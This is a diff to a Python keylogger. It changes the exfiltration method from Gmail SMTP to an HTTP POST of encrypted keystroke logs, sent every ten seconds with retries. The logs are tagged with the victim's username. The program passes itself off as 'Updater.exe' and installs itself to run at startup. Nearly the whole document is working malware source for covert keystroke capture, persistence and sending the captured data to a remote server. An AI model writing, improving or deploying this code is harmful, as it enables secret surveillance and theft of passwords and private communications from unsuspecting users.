@@ -1,5 +1,5 @@
 import keyboard, os, subprocess, sys, shutil
-import smtplib, base64
+import requests, base64
 from threading import Timer
 from datetime import datetime
 from getpass import getuser
@@ -27,14 +27,17 @@ class Cipher:
         return encrypted
 
 SEND_REPORT_EVERY = 10
-EMAIL_ADDRESS = ""
-EMAIL_PASSWORD = r""
-SEND_EMAIL = r""
 EXEC_NAME = "Updater.exe"
+POST_URL = ""
+POST_KEY_NAME = ""
+POST_EXPECTED_RESULT = ""
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, POST_EXPECTED_RESULT, POST_KEY_NAME, POST_URL):
         self.interval = interval
+        self.POST_EXPECTED_RESULT = POST_EXPECTED_RESULT
+        self.POST_KEY_NAME = POST_KEY_NAME
+        self.POST_URL = POST_URL
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
@@ -53,18 +56,24 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
     
-    def sendmail(self, to_email, email, password, message):
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, to_email, message)
-        server.quit()
+    def WebPOST(self):
+        data = {f"{self.POST_KEY_NAME}": Cipher.encrypt(plain_text=self.log, key=16)}
+        temp = 0
+        while temp < 3:
+            try:
+                r = requests.post(self.POST_URL, data=data)
+                if r.text == self.POST_EXPECTED_RESULT:
+                    break
+            except:
+                pass
+            temp += 1
+        
 
     def report(self):
         if self.log:
             self.end_dt = datetime.now()
             self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
-            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, Cipher.encrypt(plain_text=self.log, key=16))
+            self.WebPOST()
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -87,7 +96,7 @@ def run_at_startup():
 
 if __name__ == "__main__":
     run_at_startup()
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, POST_EXPECTED_RESULT=POST_EXPECTED_RESULT, POST_KEY_NAME=POST_KEY_NAME, POST_URL=POST_URL)
     keylogger.start()
 
 
